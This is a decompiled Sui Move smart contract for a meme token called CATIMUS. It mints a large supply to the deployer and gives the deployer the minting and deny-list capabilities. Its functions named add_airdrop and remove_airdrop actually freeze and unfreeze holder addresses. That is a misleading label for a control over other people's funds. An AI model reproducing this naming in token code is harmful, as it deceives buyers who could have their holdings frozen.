module 0x2a0288bcbefb154da99e809cb0cf9a504e05aa94f59f4fa803c4829d37c925d5::CATIMUS {
    struct CATIMUS has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATIMUS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CATIMUS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CATIMUS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CATIMUS>(arg0, 6, b"CATIMUS", b"Sui Catimus Prime", b"kitty bots roll out", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmW71Qz6jeBPq8VHz7Nnj4Qib155N514ccmkMsy5sfQV87?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CATIMUS>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<CATIMUS>>(0x2::coin::mint<CATIMUS>(&mut v3, 100000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CATIMUS>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CATIMUS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CATIMUS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CATIMUS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

